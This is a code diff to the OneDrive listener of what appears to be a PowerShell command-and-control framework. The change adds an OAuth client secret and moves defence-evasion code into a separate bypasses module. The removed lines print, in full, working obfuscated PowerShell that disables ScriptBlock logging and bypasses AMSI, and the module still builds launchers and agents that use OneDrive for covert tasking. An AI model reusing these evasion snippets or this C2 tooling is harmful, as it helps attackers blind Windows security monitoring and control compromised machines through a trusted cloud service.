@@ -17,6 +17,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 class Listener:
     def __init__(self, mainMenu, params=[]):
@@ -35,7 +36,12 @@ class Listener:
                 'Value'         :   'onedrive'
             },
             'ClientID' : {
-                'Description'   :   'Client ID of the OAuth App.',
+                'Description'   :   'Application ID of the OAuth App.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'ClientSecret' : {
+                'Description'   :   'Client secret of the OAuth App.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -164,7 +170,7 @@ class Listener:
 
         return True
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         if not language:
             print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")
 
@@ -184,36 +190,16 @@ class Listener:
                 launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
-                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
+                    launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
-                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    launcher += "'System.Management.Automation.Utils'"
-                    launcher += helpers.randomize_capitalization(").'GetFie`ld'(")
-                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    launcher += "['ScriptB'+'lockLogging']"
-                    launcher += helpers.randomize_capitalization("){$GPC")
-                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    launcher += helpers.randomize_capitalization("$GPC")
-                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    launcher += "('EnableScriptB'+'lockLogging',0);"
-                    launcher += helpers.randomize_capitalization("$val.Add")
-                    launcher += "('EnableScriptBlockInvocationLogging',0);"
-                    launcher += helpers.randomize_capitalization("$GPC")
-                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    launcher += helpers.randomize_capitalization("=$val}")
-                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].'GetFie`ld'(")
-                    launcher += "'signatures','N'+'onPublic,Static'"
-                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        launcher += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    launcher += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    launcher += "'System.Management.Automation.AmsiUtils'"
-                    launcher += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    launcher += "'amsiInitFailed','NonPublic,Static'"
-                    launcher += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    if AMSIBypass:
+                        launcher += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        launcher += bypasses.AMSIBypass2()
                     launcher += "};"
                     launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
@@ -327,7 +313,7 @@ class Listener:
         else:
             print helpers.color("[!] Python agent not available for Onedrive")
 
-    def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_comms(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
 
         staging_key = listener_options['StagingKey']['Value']
         base_folder = listener_options['BaseFolder']['Value']
@@ -352,6 +338,7 @@ class Listener:
         if((Get-Date) -gt $Script:TokenObject.expires) {
             $data = New-Object System.Collections.Specialized.NameValueCollection
             $data.add("client_id", "%s")
+            $data.add("client_secret", "%s")
             $data.add("grant_type", "refresh_token")
             $data.add("scope", "files.readwrite offline_access")
             $data.add("refresh_token", $Script:TokenObject.refresh)
@@ -368,7 +355,7 @@ class Listener:
         $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
         $wc
     }
-            """ % (token, refresh_token, client_id, redirect_uri)
+            """ % (token, refresh_token, client_id, client_secret, redirect_uri)
 
             post_message = """
     $script:SendMessage = {
@@ -442,7 +429,7 @@ class Listener:
 
             return token_manager + post_message + get_message
 
-    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
         """
         Generate the agent code
         """
@@ -465,7 +452,7 @@ class Listener:
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
+            comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
@@ -484,8 +471,9 @@ class Listener:
     def start_server(self, listenerOptions):
 
         # Utility functions to handle auth tasks and initial setup
-        def get_token(client_id, code):
+        def get_token(client_id, client_secret, code):
             params = {'client_id': client_id,
+                      'client_secret': client_secret,
                       'grant_type': 'authorization_code',
                       'scope': 'files.readwrite offline_access',
                       'code': code,
@@ -500,8 +488,9 @@ class Listener:
                 print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['error_codes'], r.json()['error_description']))
                 raise
 
-        def renew_token(client_id, refresh_token):
+        def renew_token(client_id, client_secret, refresh_token):
             params = {'client_id': client_id,
+                      'client_secret': client_secret,
                       'grant_type': 'refresh_token',
                       'scope': 'files.readwrite offline_access',
                       'refresh_token': refresh_token,
@@ -596,6 +585,7 @@ class Listener:
         staging_key = listener_options['StagingKey']['Value']
         poll_interval = listener_options['PollInterval']['Value']
         client_id = listener_options['ClientID']['Value']
+        client_secret = listener_options['ClientSecret']['Value']
         auth_code = listener_options['AuthCode']['Value']
         refresh_token = listener_options['RefreshToken']['Value']
         base_folder = listener_options['BaseFolder']['Value']
@@ -608,7 +598,7 @@ class Listener:
         s = Session()
 
         if refresh_token:
-            token = renew_token(client_id, refresh_token)
+            token = renew_token(client_id, client_secret, refresh_token)
             message = "[*] Refreshed auth token"
             signal = json.dumps({
                 'print' : True,
@@ -616,7 +606,7 @@ class Listener:
             })
             dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
         else:
-            token = get_token(client_id, auth_code)
+            token = get_token(client_id, client_secret, auth_code)
             message = "[*] Got new auth token"
             signal = json.dumps({
                 'print' : True,
@@ -644,7 +634,7 @@ class Listener:
             time.sleep(int(poll_interval))
             try: #Wrap the whole loop in a try/catch so one error won't kill the listener
                 if time.time() > token['expires_at']: #Get a new token if the current one has expired
-                    token = renew_token(client_id, token['refresh_token'])
+                    token = renew_token(client_id, client_secret, token['refresh_token'])
                     s.headers['Authorization'] = "Bearer " + token['access_token']
                     message = "[*] Refreshed auth token"
                     signal = json.dumps({
@@ -699,8 +689,8 @@ class Listener:
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
 
                             session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
-                            agent_token = renew_token(client_id, token['refresh_token']) #Get auth and refresh tokens for the agent to use
-                            agent_code = str(self.generate_agent(listener_options, client_id, agent_token['access_token'],
+                            agent_token = renew_token(client_id, client_secret, token['refresh_token']) #Get auth and refresh tokens for the agent to use
+                            agent_code = str(self.generate_agent(listener_options, client_id, client_secret, agent_token['access_token'],
                                                             agent_token['refresh_token'], redirect_uri, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
 
